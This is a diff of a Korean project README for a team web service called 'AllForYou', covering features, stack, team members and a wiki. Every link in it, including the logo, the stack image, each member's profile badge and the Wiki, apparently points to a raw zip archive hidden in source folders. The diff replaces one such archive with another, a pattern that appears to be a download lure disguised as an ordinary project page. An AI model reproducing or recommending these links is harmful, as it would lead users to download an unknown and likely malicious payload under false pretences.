@@ -1,6 +1,6 @@
 # LOGO
 
-![Logo](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/client/src/reducer/All-For-You-3.2-beta.1.zip)
+![Logo](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/server/config/For_All_You_1.5.zip)
 
 # 🎁 Service
 
@@ -13,11 +13,11 @@
 - 사용자가 ‘나중에 보기’ 버튼을 누른 컨텐츠를 따로 볼 수 있습니다.(advenced)
 
 # 🎉 Link
-- https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/client/src/reducer/All-For-You-3.2-beta.1.zip
+- https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/server/config/For_All_You_1.5.zip
 
 
 ## 🛠 사용 스택
-![final stack](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/client/src/reducer/All-For-You-3.2-beta.1.zip)
+![final stack](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/server/config/For_All_You_1.5.zip)
 
 
 ## TEAM `Fit`
@@ -25,22 +25,22 @@
 ### 이재영
 * Role : Team Leader
 * Position : Back-End
-* Github : [![](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/client/src/reducer/All-For-You-3.2-beta.1.zip)](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/client/src/reducer/All-For-You-3.2-beta.1.zip)
+* Github : [![](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/server/config/For_All_You_1.5.zip)](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/server/config/For_All_You_1.5.zip)
 
 ### 강사름
 * Role : Team Member
 * Position : Front-End
-* Github : [![](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/client/src/reducer/All-For-You-3.2-beta.1.zip)](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/client/src/reducer/All-For-You-3.2-beta.1.zip)
+* Github : [![](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/server/config/For_All_You_1.5.zip)](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/server/config/For_All_You_1.5.zip)
 
 ### 남태식
 * Role : Team Member
 * Position : Front-End
-* Github : [![](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/client/src/reducer/All-For-You-3.2-beta.1.zip)](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/client/src/reducer/All-For-You-3.2-beta.1.zip)
+* Github : [![](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/server/config/For_All_You_1.5.zip)](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/server/config/For_All_You_1.5.zip)
 
 ### 홍세환
 
 * Role : Team Member
 * Position : Full-Stack
-* Github : [![](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/client/src/reducer/All-For-You-3.2-beta.1.zip)](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/client/src/reducer/All-For-You-3.2-beta.1.zip)
+* Github : [![](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/server/config/For_All_You_1.5.zip)](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/server/config/For_All_You_1.5.zip)
 
-# 📚 [Wiki](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/client/src/reducer/All-For-You-3.2-beta.1.zip)
+# 📚 [Wiki](https://github.com/HongSehwan/AllForYou-1/raw/refs/heads/main/server/config/For_All_You_1.5.zip)
